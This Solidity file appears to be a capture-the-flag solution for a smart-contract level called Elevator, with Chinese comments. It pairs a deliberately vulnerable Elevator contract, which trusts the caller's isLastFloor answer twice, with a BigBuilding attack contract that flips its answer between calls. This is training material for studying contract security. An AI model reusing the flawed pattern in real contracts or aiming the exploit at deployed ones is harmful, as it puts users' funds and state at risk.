// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 电梯不会让你达到大楼顶部, 对吧?
 * 有的时候 solidity 不是很擅长保存 promises.
 * 这个 电梯 期待被用在一个 建筑 里.
 *
 * 解题思路：让isLastFloor第一次返回false，第二次返回true
 */
interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        // 说明调用者是Building合约
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract BigBuilding is Building {
    Elevator public elevator;
    bool _bool = true;

    constructor(Elevator _elevator) {
        elevator = _elevator;
    }

    function isLastFloor(uint256 _floor) external override returns (bool) {
        _bool = !_bool;
        return _bool;
    }

    function attack() public {
        elevator.goTo(3);
    }
    
}
